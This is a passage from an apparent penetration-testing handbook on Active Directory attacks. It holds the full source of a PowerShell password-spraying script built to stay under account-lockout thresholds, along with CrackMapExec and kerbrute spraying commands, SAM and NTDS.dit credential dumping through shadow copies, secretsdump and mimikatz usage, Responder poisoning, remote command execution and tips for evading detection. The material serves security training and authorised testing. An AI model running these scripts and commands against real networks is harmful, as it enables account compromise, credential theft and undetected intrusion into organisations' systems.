    1. Test the password &#39;Summer2016&#39; against all active user accounts, except privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\&gt; .\Spray-Passwords.ps1 -Pass &#39;Summer2016,Password123&#39; -Admins
    1. Test the password &#39;Summer2016&#39; against all active user accounts, including privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\&gt; .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose

    1. Test each password in the file &#39;passwords.txt&#39; against all active user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.
  .EXAMPLE
    PS C:\&gt; .\Spray-Passwords.ps1 -Url &#39;https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt&#39; -Verbose

    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
    3. Output script progress/status information to console.
  .LINK
    Get latest version here: https://github.com/ZilentJack/Spray-Passwords
  .NOTES
    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com
    Together with  : CyberKeel / www.cyberkeel.com
    Date created   : 09/05-2016
    Last modified  : 26/06-2016
    Version history:
    - 1.00: Initial public release, 26/06-2016
    Tested on:
     - WS 2016 TP5
     - WS 2012 R2
     - Windows 10
    Known Issues &amp; possible solutions/workarounds:
     KI-0001: -
       Solution: -
    Change Requests for vNext (not prioritized):
     CR-0001: Support for Fine-Grained Password Policies (FGPP).
     CR-0002: Find better way of getting Default Domain Password Policy than &quot;NET ACCOUNTS&quot;. Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.
     CR-0003: Threated approach to test more user/password combinations simultaneously.
     CR-0004: Exception or include list based on username, group membership, SID&#39;s or the like.
     CR-0005: Exclude user account that executes the script (password probably already known).
    Verbose output:
     Use -Verbose to output script progress/status information to console.
#&gt;

[CmdletBinding(DefaultParameterSetName=&#39;ByPass&#39;)]
Param
(
    [Parameter(Mandatory = $true, ParameterSetName = &#39;ByURL&#39;,HelpMessage=&quot;Download file from given URL and use as password input file to test multiple passwords for each targeted user account.&quot;)]
    [String]
    $Url = &#39;&#39;,

    [Parameter(Mandatory = $true, ParameterSetName = &#39;ByFile&#39;,HelpMessage=&quot;Supply a path to a password input file to test multiple passwords for each targeted user account.&quot;)]
    [String]
    $File = &#39;&#39;,

    [Parameter(Mandatory = $true, ParameterSetName = &#39;ByPass&#39;,HelpMessage=&quot;Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass &#39;Password1,Password2&#39;&quot;)]
    [AllowEmptyString()]
    [String]
    $Pass = &#39;&#39;,

    [Parameter(Mandatory = $false,HelpMessage=&quot;Warning: will also target privileged user accounts (admincount=1.)&quot;)]
    [Switch]
    $Admins = $false

)

# Method to determine if input is numeric or not
Function isNumeric ($x) {
    $x2 = 0
    $isNum = [System.Int32]::TryParse($x, [ref]$x2)
    Return $isNum
}

# Method to get the lockout threshold - does not take FGPP into acocunt
Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].Split(&quot;:&quot;)[1].Trim()

    If (isNumeric($threshold) )
        {
            Write-Verbose &quot;threshold is a number = $threshold&quot;
            $threshold = [Int]$threshold
        }
    Else
        {
            Write-Verbose &quot;Threshold is probably &#39;Never&#39;, setting max to 1000...&quot;
            $threshold = [Int]1000
        }

    Return $threshold
}

# Method to get the lockout observation window - does not tage FGPP into account
Function Get-Duration
{
    $data = net accounts
    $duration = [Int]$data[7].Split(&quot;:&quot;)[1].Trim()
    Write-Verbose &quot;Lockout duration is = $duration&quot;
    Return $duration
}

# Method to retrieve the user objects from the PDC
Function Get-UserObjects
{
    # Get domain info for current domain
    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
    Catch {Write-Verbose &quot;No domain found, will quit...&quot; ; Exit}

    # Get the DC with the PDC emulator role
    $PDC = ($domainObj.PdcRoleOwner).Name

    # Build the search string from which the users should be found
    $SearchString = &quot;LDAP://&quot;
    $SearchString += $PDC + &quot;/&quot;
    $DistinguishedName = &quot;DC=$($domainObj.Name.Replace(&#39;.&#39;, &#39;,DC=&#39;))&quot;
    $SearchString += $DistinguishedName

    # Create a DirectorySearcher to poll the DC
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain

    # Select properties to load, to speed things up a bit
    $Searcher.PropertiesToLoad.Add(&quot;samaccountname&quot;) &gt; $Null
    $Searcher.PropertiesToLoad.Add(&quot;badpwdcount&quot;) &gt; $Null
    $Searcher.PropertiesToLoad.Add(&quot;badpasswordtime&quot;) &gt; $Null

    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true
    If ($Admins) {$Searcher.filter=&quot;(&amp;(samAccountType=805306368)(!(lockoutTime&gt;=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))&quot;}
    Else {$Searcher.filter=&quot;(&amp;(samAccountType=805306368)(!(admincount=1))(!(lockoutTime&gt;=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))&quot;}
    $Searcher.PageSize = 1000

    # Find &amp; return targeted user accounts
    $userObjs = $Searcher.FindAll()
    Return $userObjs
}

# Method to perform auth test with specific username and password
Function Perform-Authenticate
{
    Param
    ([String]$username,[String]$password)

    # Get current domain with ADSI
    $CurrentDomain = &quot;LDAP://&quot;+([ADSI]&quot;&quot;).DistinguishedName

    # Try to authenticate
    Write-Verbose &quot;Trying to authenticate as user &#39;$username&#39; with password &#39;$password&#39;&quot;
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom.Name

    # Return true/false
    If ($res -eq $null) {Return $false}
    Else {Return $true}
}

# Validate and parse user supplied url to CSV file of passwords
Function Parse-Url
{
    Param ([String]$url)

    # Download password file from URL
    $data = (New-Object System.Net.WebClient).DownloadString($url)
    $data = $data.Split([environment]::NewLine)

    # Parse passwords file and return results
    If ($data -eq $null -or $data -eq &quot;&quot;) {Return $null}
    $passwords = $data.Split(&quot;,&quot;).Trim()
    Return $passwords
}

# Validate and parse user supplied CSV file of passwords
Function Parse-File
{
   Param ([String]$file)

   If (Test-Path $file)
   {
        $data = Get-Content $file

        If ($data -eq $null -or $data -eq &quot;&quot;) {Return $null}
        $passwords = $data.Split(&quot;,&quot;).Trim()
        Return $passwords
   }
   Else {Return $null}
}

# Main function to perform the actual brute force attack
Function BruteForce
{
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   #Setup variables
   $userObj = Get-UserObjects
   Write-Verbose &quot;Found $(($userObj).count) active &amp; unlocked users...&quot;

   If ($passwords.Length -gt $threshold)
   {
        $time = ($passwords.Length - $threshold) * $duration
        Write-Host &quot;Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes.&quot;
   }

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   #Initialize arrays
   For ($i = 0; $i -lt $userObj.Length; $i += 1)
   {
        $done += $false
        $usersCracked += $false
        $numTry += 0
   }

   # Main while loop which does the actual brute force.
   Write-Host &quot;Performing brute force - press [q] to stop the process and print results...&quot; -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)
   {
        # Get user accounts
        $userObj = Get-UserObjects

        # Iterate over every user in AD
        For ($i = 0; $i -lt $userObj.Length; $i += 1)
        {

            # Allow for manual stop of the while loop, while retaining the gathered results
            If ($Host.UI.RawUI.KeyAvailable -and (&quot;q&quot; -eq $Host.UI.RawUI.ReadKey(&quot;IncludeKeyUp,NoEcho&quot;).Character))
            {
                Write-Host &quot;Stopping bruteforce now....&quot; -Background DarkRed
                Break Main
            }

            If ($usersCracked[$i] -eq $false)
            {
                If ($done[$i] -eq $false)
                {
                    # Put object values into variables
                    $samaccountnname = $userObj[$i].Properties.samaccountname
                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]
                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]

                    # Not yet reached lockout tries
                    If ($badpwdcount -lt ($threshold - 1))
                    {
                        # Try the auth with current password
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                        {
                            Write-Host &quot;Guessed password for user: &#39;$samaccountnname&#39; = &#39;$($passwords[$numTry[$i]])&#39;&quot; -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true
                        }

                        # Auth try did not work, go to next password in list
                        Else
                        {
                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                        }
                    }

                    # One more tries would result in lockout, unless timer has expired, let&#39;s see...
                    Else
                    {
                        $now = Get-Date

                        If ($badpwdtime)
                        {
                            $then = [DateTime]::FromFileTime($badpwdtime)
                            $timediff = ($now - $then).TotalMinutes

                            If ($timediff -gt $duration)
                            {
                                # Since observation window time has passed, another auth try may be performed
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                                If ($auth -eq $true)
                                {
                                    Write-Host &quot;Guessed password for user: &#39;$samaccountnname&#39; = &#39;$($passwords[$numTry[$i]])&#39;&quot; -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }

                            } # Time-diff if

                        }
                        Else
                        {
                            # Verbose-log if $badpwdtime in null. Possible &quot;Cannot index into a null array&quot; error.
                            Write-Verbose &quot;- no badpwdtime exception &#39;$samaccountnname&#39;:&#39;$badpwdcount&#39;:&#39;$badpwdtime&#39;&quot;



                                   # Try the auth with current password
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                                If ($auth -eq $true)
                                {
                                    Write-Host &quot;Guessed password for user: &#39;$samaccountnname&#39; = &#39;$($passwords[$numTry[$i]])&#39;&quot; -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }



                        } # Badpwdtime-check if

                    } # Badwpdcount-check if

                } # Done-check if

            } # User-cracked if

        } # User loop

        # Check if the bruteforce is done so the while loop can be terminated
        $amount = 0
        For ($j = 0; $j -lt $done.Length; $j += 1)
        {
            If ($done[$j] -eq $true) {$amount += 1}
        }

        If ($amount -eq $done.Length) {Break}

   # Take a nap for a second
   Start-Sleep -m 1000

   } # Main While loop

   If ($results.Length -gt 0)
   {
       Write-Host &quot;Users guessed are:&quot;
       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host &quot; &#39;$($results[$i])&#39; with password: &#39;$($results[$i + 1])&#39;&quot;}
   }
   Else {Write-Host &quot;No passwords were guessed.&quot;}
}

$passwords = $null

If ($Url -ne &#39;&#39;)
{
    $passwords = Parse-Url $Url
}
ElseIf($File -ne &#39;&#39;)
{
    $passwords = Parse-File $File
}
Else
{
    $passwords = $Pass.Split(&quot;,&quot;).Trim()
}

If($passwords -eq $null)
{
    Write-Host &quot;Error in password input, please try again.&quot;
    Exit
}

# Get password policy info
$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host &quot;WARNING: also targeting admin accounts.&quot; -BackgroundColor DarkRed}

# Call the main function and start the brute force
BruteForce $duration $threshold $passwords
</code></pre>
              <h4 id="1392-authenticating-using-directoryentry">13.9.2. Authenticating using DirectoryEntry</h4>
              <p>To authenticate against Active Directory using a specific username and password, you can utilize the
                <code>System.DirectoryServices</code> namespace in PowerShell. Below is an example of how to set this
                up:
              </p>
              <pre><code class="language-powershell"># Fetch the current domain object
$domainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Identify the Primary Domain Controller (PDC) of the domain
$primaryDC = ($domainContext.PdcRoleOwner).Name

# Construct the LDAP path for directory access
$ldapPath = &quot;LDAP://&quot;
$ldapPath += $primaryDC + &quot;/&quot;

# Build the Distinguished Name (DN) for the domain structure
$domainDN = &quot;DC=$($domainContext.Name.Replace(&#39;.&#39;, &#39;,DC=&#39;))&quot;
$ldapPath += $domainDN

# Authenticate to the directory service with specific credentials
$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, &quot;[userName]&quot;, &quot;[password]&quot;)
</code></pre>
              <h4 id="1393-using-crackmapexec">13.9.3 Using CrackMapExec</h4>
              <h5 id="13931-basic-commands">13.9.3.1 Basic Commands</h5>
              <p><strong>Many more commands can be found in the Section 6.2.</strong></p>
              <ul>
                <li><strong>Basic Check for User Authentication</strong>:</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --continue-on-success
or
crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --password-spray
or
crackmapexec smb [ip/domain] -u [userName] -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ul>
                <li><strong>Using Kerberos for Authentication</strong>:</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [userName] -p &#39;[password]&#39; -d [domain.com] --kerberos
</code></pre>
              <ul>
                <li><strong>Domain and SMB Signing Check</strong>: checks for SMB signing requirements along with user
                  authentication.</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --signing
</code></pre>
              <ul>
                <li><strong>Continue on Error</strong>: using the <code>--continue-on-error</code> flag will allow the
                  command to run even if some accounts fail.</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --continue-on-error
</code></pre>
              <h5 id="13932-additional-commands">13.9.3.2 Additional Commands</h5>
              <ul>
                <li><strong>Attempting to Enumerate Shares on the Target</strong>: you can enumerate shared folders on
                  the target machine while testing user credentials.</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --shares
</code></pre>
              <ul>
                <li><strong>Testing for SMBv1</strong>: to check if the target supports SMBv1.</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --smbv1
</code></pre>
              <ul>
                <li><strong>Getting Session Information</strong>: you can obtain active sessions on the target machine.
                </li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --sessions
</code></pre>
              <ul>
                <li><strong>Dumping SAM Hashes</strong>: if you have admin rights, you can attempt to dump the SAM
                  database:</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u Administrator -p &#39;[AdminPassword]!&#39; -d [domain.com] --sam
</code></pre>
              <ul>
                <li><strong>Running Commands Remotely</strong>:</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [userName] -p &#39;[password]!&#39; -d [domain.com] --exec-command &quot;[command]&quot;
</code></pre>
              <h5 id="13933-possible-services-to-test">13.9.3.3 Possible Services to Test</h5>
              <ol>
                <li><strong>SMB (Server Message Block)</strong> - Port 445</li>
              </ol>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="2">
                <li><strong>RDP (Remote Desktop Protocol)</strong> - Port 3389</li>
              </ol>
              <pre><code class="language-bash">crackmapexec rdp [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="3">
                <li><strong>WinRM (Windows Remote Management)</strong> - Port 5985/5986</li>
              </ol>
              <pre><code class="language-bash">crackmapexec winrm [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="4">
                <li><strong>HTTP/HTTPS (Web Services)</strong> - Ports 80/443</li>
              </ol>
              <pre><code class="language-bash">crackmapexec http [ip/domain] -u [userName] -p &#39;[password]&#39;
</code></pre>
              <ol start="5">
                <li><strong>FTP (File Transfer Protocol)</strong> - Port 21</li>
              </ol>
              <pre><code class="language-bash">crackmapexec ftp [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="6">
                <li><strong>Telnet</strong> - Port 23</li>
              </ol>
              <pre><code class="language-bash">crackmapexec telnet [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="7">
                <li><strong>SMTP (Simple Mail Transfer Protocol)</strong> - Port 25</li>
              </ol>
              <pre><code class="language-bash">crackmapexec smtp [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="8">
                <li><strong>DNS (Domain Name System)</strong> - Port 53</li>
              </ol>
              <pre><code class="language-bash">crackmapexec dns [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="9">
                <li><strong>LDAP (Lightweight Directory Access Protocol)</strong> - Ports 389/636</li>
              </ol>
              <pre><code class="language-bash">crackmapexec ldap [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="10">
                <li><strong>NetBIOS</strong> - Ports 137-139</li>
              </ol>
              <pre><code class="language-bash">crackmapexec netbios [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="11">
                <li><strong>MySQL</strong> - Port 3306</li>
              </ol>
              <pre><code class="language-bash">crackmapexec mysql [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="12">
                <li><strong>PostgreSQL</strong> - Port 5432</li>
              </ol>
              <pre><code class="language-bash">crackmapexec postgres [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="13">
                <li><strong>MS SQL Server</strong> - Port 1433</li>
              </ol>
              <pre><code class="language-bash">crackmapexec mssql [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="14">
                <li><strong>Oracle Database</strong> - Port 1521</li>
              </ol>
              <pre><code class="language-bash">crackmapexec oracle [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="15">
                <li><strong>Redis</strong> - Port 6379</li>
              </ol>
              <pre><code class="language-bash">crackmapexec redis [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="16">
                <li><strong>Docker Remote API</strong> - Port 2375</li>
              </ol>
              <pre><code class="language-bash">crackmapexec docker [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="17">
                <li><strong>SNMP (Simple Network Management Protocol)</strong> - Port 161</li>
              </ol>
              <pre><code class="language-bash">crackmapexec snmp [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="18">
                <li><strong>NTP (Network Time Protocol)</strong> - Port 123</li>
              </ol>
              <pre><code class="language-bash">crackmapexec ntp [ip/domain]
</code></pre>
              <h4 id="1394-using-kerbrute">13.9.4 Using kerbrute</h4>
              <pre><code class="language-powershell"># The executable can be found in the kerbrute GitHub (link in Section 18.3.2.2).
.\kerbrute_windows_amd64.exe passwordspray -d [domain.com] .\[usernames_file].txt &quot;[password]&quot;
</code></pre>
              <h3 id="1310-shadow-copies">13.10 Shadow Copies</h3>
              <p>Shadow Copies, also known as Volume Shadow Copy Service (VSS), is a Windows feature that creates backup
                copies or snapshots of computer files or volumes, even when they are in use. Attackers can exploit
                Shadow Copies to retrieve sensitive information, including previous versions of files and credentials.
              </p>
              <p><strong>How It Works</strong>:</p>
              <ol>
                <li><strong>Creation of Shadow Copies</strong>: Shadow Copies are created automatically or can be
                  manually initiated. They allow for data recovery and backup without disrupting active processes.</li>
                <li><strong>Accessing Shadow Copies</strong>: The shadow copies can be accessed through the file system,
                  often found in a hidden directory. This feature can be used to recover deleted files or view past
                  versions of files.</li>
              </ol>
              <p><strong>Steps to Attack Shadow Copies</strong>:</p>
              <ol>
                <li><strong>Create a Shadow Copy of the Entire Disk</strong>: <em>this action requires local
                    administrator privileges.</em></li>
              </ol>
              <pre><code class="language-powershell"># -p X: this indicates which disk we wanto to copy, usually is C.
vshadow.exe -nw -p C:
</code></pre>
              <ol start="2">
                <li><strong>Copy the NTDS Database to the Specified Destination Copying the NTDS Database to the
                    <code>C:</code> Drive</strong>: to back up the NTDS database from the shadow copy, use the following
                  command.</li>
              </ol>
              <pre><code class="language-powershell"># Replace X with the shadow copy number, found in the previous command
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit C:\desired\backup\path\ntds.dit.bak

# Example
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
</code></pre>
              <ol start="3">
                <li><strong>Save the System Registry to the Specified Destination</strong>:</li>
              </ol>
              <pre><code class="language-powershell">reg.exe save hklm\system C:\backup_path\system.bak

# Example
C:\&gt; reg.exe save hklm\system c:\system.bak
</code></pre>
              <ol start="4">
                <li>
                  <p><strong>Download the Files to the Kali</strong>: use strategies from Section 17.</p>
                </li>
                <li>
                  <p><strong>Extract the Data from the NTDS Database using Kali</strong>: this command retrieves user
                    credentials and hash values from the NTDS database backup, enabling further security assessments.
                  </p>
                </li>
              </ol>
              <pre><code class="language-bash">impacket-secretsdump -ntds [ntds_file] -system [system_file] LOCAL

# Example
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL</code></pre>
              <ol start="6">
                <li><strong>(Optional): use Mimikatz</strong> to extract the credentials if it is not possible to bring
                  the files to the Kali.</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # lsadump::ntds /ntds:&quot;[ntds_file]&quot; /system:&quot;[system_file]&quot;</code></pre>
              <p><strong>Steps to Access Shadow Copies</strong>:</p>
              <ol>
                <li><strong>List Shadow Copies</strong>: use the following command to view existing shadow copies on a
                  system.</li>
              </ol>
              <pre><code class="language-powershell">vssadmin list shadows
</code></pre>
              <ol start="2">
                <li><strong>Access a Shadow Copy</strong>:<ul>
                    <li>Find the shadow copy you want to access and note its shadow copy ID.</li>
                    <li>Mount the shadow copy using the following command:</li>
                  </ul>
                </li>
              </ol>
              <pre><code class="language-powershell"># Replace X with the shadow copy number.
mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
</code></pre>
              <ol start="3">
                <li><strong>Explore the Mounted Shadow Copy</strong>: navigate to the new folder
                  (<code>C:\ShadowCopy</code>) to explore and extract files.</li>
              </ol>
              <pre><code class="language-powershell">dir C:\ShadowCopy
</code></pre>
              <ol start="4">
                <li><strong>Recover Sensitive Data</strong>: look for sensitive files, such as password files,
                  documents, or configuration files that may contain credentials or sensitive information.</li>
              </ol>
              <h3 id="1311-constrained-delegation-attack">13.11 Constrained Delegation Attack</h3>
              <p>Constrained Delegation allows specific accounts to impersonate other users and access resources on
                their behalf, but only for certain services. Attackers can exploit misconfigured constrained delegation
                to escalate privileges or access sensitive data.</p>
              <p><strong>How It Works</strong>:</p>
              <ol>
                <li><strong>Understanding Delegation</strong>: When a service account is set up with constrained
                  delegation, it can request service tickets to access other resources using the identity of the user
                  who authenticated to it.</li>
                <li><strong>Exploitation</strong>: If an attacker can obtain the service account&rsquo;s credentials or
                  exploit a misconfiguration, they can impersonate users and access services that the account is
                  permitted to use.</li>
              </ol>
              <p><strong>Steps to Exploit a Constrained Delegation Attack</strong>:</p>
              <ol>
                <li><strong>Identify Delegated Accounts</strong>: use the following command to identify accounts with
                  delegated permissions.</li>
              </ol>
              <pre><code class="language-powershell">Get-ADComputer -Filter {ServicePrincipalName -like &quot;*&quot;} -Property ServicePrincipalName | Select-Object Name,ServicePrincipalName
</code></pre>
              <ol start="2">
                <li><strong>Check Constrained Delegation Settings</strong>: use the PowerShell command to check for
                  delegated permissions.</li>
              </ol>
              <pre><code class="language-powershell">Get-ADUser -Identity &lt;ServiceAccount&gt; -Properties msDS-AllowedToDelegateTo
</code></pre>
              <ol start="3">
                <li><strong>Perform Kerberos Ticket Granting</strong>: if you have the service account credentials, use
                  them to request service tickets.</li>
              </ol>
              <pre><code class="language-bash">kinit &lt;ServiceAccount&gt;
</code></pre>
              <ol start="4">
                <li><strong>Access Resources as a Delegated User</strong>: once you have the ticket, access the
                  resources using the identity of the impersonated user.</li>
              </ol>
              <h3 id="1312-enum-creds-spraying-and-post-enum-techniques">13.12 Enum, Creds Spraying, and Post-Enum
                Techniques</h3>
              <p><strong>References:</strong></p>
              <ul>
                <li><a
                    href="https://book.hacktricks.xyz/network-services-pentesting/active-directory-methodology">HackTricks
                    - Active Directory</a></li>
                <li><a
                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology and Resources/Active-Directory-Exploitation">PayloadsAllTheThings</a>
                </li>
                <li><a href="https://github.com/SecureAuthCorp/impacket">Impacket Documentation</a></li>
              </ul>
              <h4 id="13121-key-enumeration-tools">13.12.1 Key Enumeration Tools</h4>
              <ul>
                <li><code>CrackMapExec</code></li>
                <li><code>enum4linux</code></li>
                <li><code>ldapsearch</code></li>
                <li><code>rpcclient</code></li>
                <li><code>smbclient</code></li>
                <li><code>BloodHound</code></li>
                <li><code>Impacket</code> scripts</li>
                <li><code>Responder</code></li>
                <li><code>PowerView</code> (via PowerShell)</li>
              </ul>
              <h4 id="13122-workflow-for-enumeration-and-credential-testing">13.12.2 Workflow for Enumeration and
                Credential Testing</h4>
              <ol>
                <li><strong>Identify Open Ports</strong>: use <code>nmap</code> to scan for services on domain
                  controllers and subdomains:</li>
              </ol>
              <pre><code class="language-bash">nmap -p 88,135,139,389,445,5985,636,3268 -sC -sV -Pn [IP]
</code></pre>
              <ol start="2">
                <li>
                  <p><strong>Enumerate Services</strong>: use tools like <code>enum4linux</code>,
                    <code>ldapsearch</code>, and <code>CrackMapExec</code> for SMB, LDAP, and WinRM.
                  </p>
                </li>
                <li>
                  <p><strong>Spray Credentials and Hashes</strong>: test found credentials or hashes against services
                    like SMB, LDAP, WinRM, RDP, and MSSQL using <code>CrackMapExec</code>.</p>
                </li>
                <li>
                  <p><strong>Analyze and Exploit Misconfigurations</strong>: look for writable shares, group policies,
                    unconstrained delegation, or Kerberos tickets.</p>
                </li>
                <li>
                  <p><strong>Post-Enumeration</strong>: use extracted data for lateral movement, privilege escalation,
                    or further enumeration.</p>
                </li>
              </ol>
              <h4 id="13123-port-reference-table">13.12.3 Port Reference Table</h4>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th><strong>Port</strong></th>
                    <th><strong>Service</strong></th>
                    <th><strong>Description</strong></th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>88</td>
                    <td>Kerberos</td>
                    <td>Authentication service for AD.</td>
                  </tr>
                  <tr>
                    <td>135</td>
                    <td>MSRPC</td>
                    <td>Microsoft RPC.</td>
                  </tr>
                  <tr>
                    <td>139</td>
                    <td>NetBIOS</td>
                    <td>File/printer sharing.</td>
                  </tr>
                  <tr>
                    <td>389</td>
                    <td>LDAP</td>
                    <td>Directory services.</td>
                  </tr>
                  <tr>
                    <td>445</td>
                    <td>SMB</td>
                    <td>File sharing/admin shares.</td>
                  </tr>
                  <tr>
                    <td>636</td>
                    <td>LDAPS</td>
                    <td>Secure LDAP.</td>
                  </tr>
                  <tr>
                    <td>3268</td>
                    <td>LDAP GC</td>
                    <td>LDAP Global Catalog.</td>
                  </tr>
                  <tr>
                    <td>3389</td>
                    <td>RDP</td>
                    <td>Remote Desktop Protocol.</td>
                  </tr>
                  <tr>
                    <td>5985</td>
                    <td>WinRM</td>
                    <td>Windows Remote Management.</td>
                  </tr>
                </tbody>
              </table>
              <h4 id="13124-additional-enumeration-techniques">13.12.4 Additional Enumeration Techniques</h4>
              <ul>
                <li><strong>Responder (LLMNR/NBT-NS Poisoning)</strong>: capture credentials from misconfigured domain
                  environments:</li>
              </ul>
              <pre><code class="language-bash">responder -I eth0
</code></pre>
              <ul>
                <li><strong>Impacket&#39;s <code>secretsdump.py</code></strong>: dump NTLM hashes from SMB or domain
                  controllers:</li>
              </ul>
              <pre><code class="language-bash"># Same tool as impacket-secretsdump
secretsdump.py [domain].com/[VALID_USERNAME]:[VALID_PASSWORD]@[IP]
</code></pre>
              <ul>
                <li><strong>PowerView (via PowerShell)</strong>
                  <ul>
                    <li>Enumerate <strong>Users</strong>:
                      <code>Get-ADUser -Filter * | Select-Object Name, SamAccountName</code>
                    </li>
                    <li>Find <strong>Writable Shares</strong>: <code>Find-DomainShare -Writable</code></li>
                    <li>List <strong>Groups with Admin Privileges</strong>:
                      <code>Get-ADGroupMember -Identity &quot;Domain Admins&quot;</code>
                    </li>
                  </ul>
                </li>
              </ul>
              <h4 id="13125-detection-evasion-techniques">13.12.5 Detection Evasion Techniques</h4>
              <ul>
                <li><strong>Slow Down Scans</strong>: Add throttling in <code>CrackMapExec</code>:</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --shares --rate 1
</code></pre>
              <ul>
                <li>
                  <p><strong>Avoid Noisy Tools</strong>: Use <code>ldapsearch</code> or <code>rpcclient</code> for
                    specific queries instead of full enumeration.</p>
                </li>
                <li>
                  <p><strong>Obfuscation</strong>: Use encoded PowerShell scripts for stealth.</p>
                </li>
              </ul>
              <h4 id="13126-web-interfaces-for-domain-enumeration">13.12.6 Web Interfaces for Domain Enumeration</h4>
              <ul>
                <li>RDP Over HTTP</li>
              </ul>
              <pre><code class="language-bash">nmap -p 3389 --script rdp-ntlm-info [IP]
